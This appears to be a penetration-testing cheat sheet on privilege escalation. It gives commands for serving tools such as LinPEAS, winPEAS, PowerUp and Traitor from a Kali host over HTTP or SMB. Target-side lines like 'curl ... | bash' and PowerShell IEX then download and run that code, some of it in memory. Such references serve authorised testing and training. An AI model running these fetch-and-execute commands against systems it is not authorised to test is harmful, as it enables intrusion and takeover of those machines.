# Privilege Escalation

## Linux

- HTTP

Host the file
```
cd /opt/linux_privesc
sudo python -m http.server 80
```


### LinPEAS

```
curl http://<Kali IP>/linpeas.sh | bash
```
or
```
wget http://<Kali IP>/linpeas.sh
bash linpeas.sh
```

### LinEnum.sh

```
curl http://<Kali IP>/LinEnum.sh | bash
```
or
```
wget http://<Kali IP>/LinEnum.sh
bash LinEnum.sh
```

### linuxprivchecker.py

```
wget http://<Kali IP>/linuxprivchecker.py
python linuxprivchecker.py
```

### Trator

```
wget http://<Kali IP>/traitor-amd64
chmod +x traitor-amd64
./traitor-amd64 -a
```


## Windows

### winPEAS

- HTTP

Host the file
```
cd /usr/share/windows-resources/binaries
sudo python -m http.server 80
```

Copy on Target and execute
```
Invoke-WebRequest -Uri 'http://<Kali IP>/winPEASany.exe' -OutFile <Path>\winPEASany.exe
<Path>\winPEASany.exe
```
Or execute direct on memory
```
IEX(New-Object Net.WebClient).downloadstring('http://<Kali IP>/winPEASany.exe')
```

- SMB

Host the file
```
cd /usr/share/windows-resources/binaries
impacket-smbserver share $(pwd) -smb2support
```

```
net use \\<Kali IP>\share
copy \\<Kali IP>\share\winPEASany.exe .
winPEASany.exe
```
or
```
xcopy \\<Kali IP>\share\winPEASany.exe C:\Temp\winPEAS\

cd C:\Temp\winPEAS
C:\Temp\winPEAS\winPEASany.exe
```


### PowerUp

- HTTP

Host the file
```
cd /usr/share/windows-resources/powersploit/Privesc/
sudo python -m http.server 80
```

Copy on Target and execute
```
Invoke-WebRequest -Uri 'http://<Kali IP>/PowerUp.ps1' -OutFile <Path>\PowerUp.ps1
Import-Module <Path>\PowerUp.ps1
Invoke-AllChecks
```
Or execute direct on memory
```
IEX(New-Object Net.WebClient).downloadstring('http://<Kali IP>/PowerUp.ps1')
Invoke-AllChecks
```

- SMB

Host the file
```
cd /usr/share/windows-resources/powersploit/Privesc/
impacket-smbserver share $(pwd) -smb2support
```

```
net use \\<Kali IP>\share
copy \\<Kali IP>\share\PowerUp.ps1 .
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
or
```
xcopy \\<Kali IP>\share\PowerUp.ps1 C:\Temp\PowerUp\

Import-Module C:\Temp\PowerUp\PowerUp.ps1
Invoke-AllChecks
```



# Links

- [Basic Linux privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker)
- [Trator](https://github.com/liamg/traitor)
- [GTFOBins](https://gtfobins.github.io/)